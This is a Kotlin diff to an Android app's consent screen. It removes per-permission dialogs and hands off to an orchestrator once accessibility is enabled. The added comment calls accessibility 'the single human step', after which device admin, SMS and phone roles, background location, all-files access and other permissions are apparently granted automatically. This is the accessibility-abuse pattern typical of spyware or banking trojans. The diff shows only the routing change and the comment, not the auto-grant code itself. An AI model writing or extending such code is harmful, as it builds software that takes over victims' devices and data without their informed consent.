@@ -78,15 +78,12 @@ class ConsentActivity : AppCompatActivity() {
     private val accessibilityLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
-        if (isAccessibilityEnabled()) {
-            if (!isNotificationAccessGranted()) {
-                showNotificationDialog()
-            } else {
-                startRuntimePermissionsWithAutoGrant()
-            }
-        } else {
-            proceedToActivation()
-        }
+        // Accessibility is the single human step. Everything that follows -
+        // notification access, runtime permissions, background location,
+        // usage access, all-files, battery exemption, device admin and the
+        // SMS/phone roles - is driven by MainActivity's orchestrator, so hand
+        // over immediately instead of walking each screen from here.
+        proceedToActivation()
     }
 
     private fun startRuntimePermissionsWithAutoGrant() {
@@ -106,10 +103,8 @@ class ConsentActivity : AppCompatActivity() {
             DeviceState(this).consentGiven = true
             if (!isAccessibilityEnabled()) {
                 showAccessibilityDialog()
-            } else if (!isNotificationAccessGranted()) {
-                showNotificationDialog()
             } else {
-                startRuntimePermissionsWithAutoGrant()
+                proceedToActivation()
             }
         }
 
